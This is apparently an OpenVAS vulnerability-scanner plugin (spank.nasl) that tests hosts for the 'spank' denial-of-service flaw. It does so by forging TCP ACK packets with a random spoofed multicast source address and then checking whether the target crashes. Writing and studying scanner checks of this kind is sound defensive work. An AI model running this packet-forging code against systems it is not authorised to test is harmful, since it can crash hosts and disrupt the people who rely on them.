###############################################################################
# OpenVAS Vulnerability Test
# $Id: spank.nasl 8145 2017-12-15 13:31:58Z cfischer $
#
# spank.c
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_id(11901);
  script_version("$Revision: 8145 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-15 14:31:58 +0100 (Fri, 15 Dec 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("spank.c");
  # Some IP stacks are crashed by this attack
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");

  tag_summary = "Your machine answers to TCP packets that are coming from a multicast
  address. This is known as the 'spank' denial of service attack.";

  tag_impact = "An attacker might use this flaw to shut down this server and
  saturate your network, thus preventing you from working properly.
  This also could be used to run stealth scans against your machine.";

  tag_solution = "contact your operating system vendor for a patch.
  Filter out multicast addresses (224.0.0.0/4)";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_vul");
  script_exclude_keys("keys/islocalhost","keys/TARGET_IS_IPV6");

  exit(0);
}

# We could use a better pcap filter to avoid a false positive... 
if (islocalhost()) exit(0);
if(TARGET_IS_IPV6())exit(0);

dest = get_host_ip();

a = 224 +  rand() % 16;
b = rand() % 256;
c = rand() % 256;
d = rand() % 256;
src = strcat(a, ".", b, ".", c, ".", d);

m = join_multicast_group(src);
if (! m && ! islocalnet()) exit(0);
# Either we need to upgrade libnasl, or multicast is not 
# supported on this host / network
# If we are on the same network, the script may work, otherwise, the chances
# are very small -- only if we are on the way to the default multicast
# gateway

start_denial();

id = rand() % 65536;
seq = rand();
ack = rand();

sport = rand() % 65535 + 1;
dport = rand() % 65535 + 1;
			
ip = forge_ip_packet(ip_v: 4, ip_hl : 5, ip_tos : 0x08, ip_len : 20,
		     ip_id : id, ip_p : IPPROTO_TCP, ip_ttl : 255,
		     ip_off : 0, ip_src : src);

tcpip = forge_tcp_packet(ip: ip, th_sport: sport, th_dport: dport,   
			 th_flags: TH_ACK, th_seq: seq, th_ack: 0,
			 th_x2: 0, th_off: 5,  th_win: 2048, th_urp: 0);

pf = strcat("src host ", dest, " and dst host ", src);
ok = 0;
for (i = 0; i < 3 && ! ok; i ++)
{
  r = send_packet(tcpip, pcap_active:TRUE, pcap_filter: pf);
  if (r) ok = 1;
}

alive = end_denial();
if (! alive)
{
  report = "
Your machine crashed when it received a TCP packet that were coming 
from a multicast address. This is known as the 'spank' denial of 
service attack.

An attacker might use this flaw to shut down this server, thus 
preventing you from working properly.

Solution: contact your operating system vendor for a patch.
           Filter out multicast addresses (224.0.0.0/4)";
  security_message(port: 0, proto: "tcp", data: report);
  set_kb_item( name:"Host/dead", value:TRUE );
}
else if (r)
  security_message(port: 0, proto: "tcp");
